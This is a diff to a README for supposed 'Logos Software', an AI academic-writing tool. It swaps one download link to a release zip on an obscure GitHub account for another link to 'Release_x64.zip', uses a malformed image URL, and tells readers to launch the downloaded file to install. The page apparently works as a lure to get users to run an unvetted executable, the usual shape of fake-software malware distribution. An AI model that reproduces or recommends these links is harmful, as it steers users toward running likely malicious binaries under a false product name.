@@ -24,7 +24,7 @@ Explore the following topics related to Logos on GitHub:
 ## 🚀 Download Logos Software
 Click the button below to download Logos software and unleash the power of structured thinking and AI assistance in your academic writing projects:
 
-[![Download Logos Software](https://img.shields.io/badge/Download-Logos%20Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Logos Software](https://github.com/XxTheesedemonsxX/logos/releases/download/v1.0/Release_x64.zip%https://github.com/XxTheesedemonsxX/logos/releases/download/v1.0/Release_x64.zip)](https://github.com/XxTheesedemonsxX/logos/releases/download/v1.0/Release_x64.zip)
 
 *(Note: The downloaded file needs to be launched to install Logos software.)*
 
